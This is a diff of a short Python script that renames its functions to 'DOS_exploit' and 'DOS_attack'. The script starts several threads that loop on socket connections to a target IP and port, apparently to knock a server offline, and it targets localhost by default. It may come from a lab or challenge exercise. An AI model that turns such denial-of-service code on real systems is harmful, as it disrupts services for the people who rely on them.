@@ -2,7 +2,7 @@
 import socket
 import threading
 
-def exploit(ip,port):
+def DOS_exploit(ip,port):
     print('init success',ip,port)
     while True:
         try:
@@ -19,16 +19,14 @@ def exploit(ip,port):
         finally:
             s.close()
 
-def multi(ip,port):
-    global threadnum
+def DOS_attack(ip='127.0.0.1',port=8889,threadnum=4):
+    # threadnum = 10 # guess cpu?  perhaps 4 threads can also fuck the server >.<
     pool = []
     for _ in range(threadnum):
-        thr = threading.Thread(target = exploit,args=(ip,port))
+        thr = threading.Thread(target = DOS_exploit,args=(ip,port))
         pool.append(thr)
         thr.start()
     
-ip ='127.0.0.1'
-port = 8889
-threadnum = 10 # guess cpu?  perhaps 4 threads can also fuck the server >.<
 if __name__ == '__main__':
-    multi(ip,port)
+    DOS_attack('127.0.0.1',8888,4)
+    
